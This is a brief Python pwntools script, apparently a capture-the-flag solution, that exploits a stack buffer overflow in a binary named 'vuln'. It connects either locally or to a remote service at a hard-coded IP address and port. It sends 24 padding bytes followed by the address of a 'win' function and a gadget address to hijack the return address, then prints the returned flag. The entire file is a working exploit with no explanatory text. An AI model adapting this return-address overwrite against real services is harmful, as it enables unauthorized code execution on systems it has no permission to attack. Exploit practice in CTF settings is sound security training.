from pwn import *

debug = False

if debug:
    p = process("./vuln")
else:
    p = remote("34.78.240.11", 55343)

elf = ELF("./vuln", checksec=False)

payload = b""
payload += b"A"*24
payload += p64(elf.symbols["win"])
payload += p64(0x0000000000401016)

p.recv()
p.sendline(payload)
flag = p.recvuntil(b'}').strip().decode()
print(flag)
